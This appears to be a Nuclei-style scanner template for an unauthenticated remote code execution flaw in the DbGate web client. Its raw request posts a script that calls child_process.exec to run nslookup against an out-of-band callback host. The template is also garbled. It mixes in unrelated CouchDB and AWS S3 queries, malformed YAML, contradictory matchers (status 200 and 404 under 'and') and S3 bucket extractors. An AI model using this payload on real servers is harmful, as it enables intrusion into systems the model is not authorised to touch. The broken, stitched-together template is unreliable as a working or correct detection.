id: dbgate-unauth-rce

info:
    name: DbGate Web Client - Unauthenticated Remote Command Execution
    author: h0j3n,cccc
    severity: critical
    description: |
        DbGate Web Client Management is suspectible to an unauthenticated remote code execution vulnerability.
    reference:
        - https://github.com/dbgate/dbgate
        - https://dbgate.org/docs/env-variables.html
    classification:
        cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
        cvss-score: 9.8
        cwe-id: CWE-200
    metadata:
        verified: true
        max-request: 1
        shodan-query: "http.favicon.hash:1198579728"
        fofa-query: app="APACHE-CouchDB"
        google-query: inurl:s3.amazonaws.com intitle:"AWS S3 Explorer"
    tags: [http,rce,oast,electron,dbgate,oss]

self-contained: true


http:
    - raw:
        - |
            POST /runners/start HTTP/1.1
            Host: {{Hostname}}
            Content-Type: application/json

            {"script":"process.mainModule.require('child_process').exec('nslookup {{interactsh-url}}')"}
    method: GET
    path:- "{{BaseURL}}"
    headers:
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Accept-Language: en-US,en;q=0.9,hi;q=0.8
      Accept-Encoding: gzip, deflate

    payloads:

    iterate-all: true
    stop-at-first-match: true
    host-redirects: true
    max-redirects: 1

    unsafe: true
    
    matchers-condition: and
    matchers:
        [
            - type: dsl
            dsl:
                - status_code == 200
                - contains(body, '\"runid\"')
                - contains(interactsh_protocol, "dns")
        ]
        [
            type: word
            part: host
            name: airee
            negative: true
            case-insensitive: true
            condition: and
            words: [
                - Oops.</h2><p class="text-muted text-tight">The page you're looking for doesn't exist.
            ]
        ]
        [
            - type: status
            status:
            - 404
        ]

        condition: and

    extractors:
    - type: regex
        part: body
        group: 1
        regex:
        - '<li>BucketName: (.*?)</li>'
        - '<BucketName>(.*?)</BucketName>'

    - type: json
        part: body
        name: path
        json:
        - '.[]'
        internal: true
  
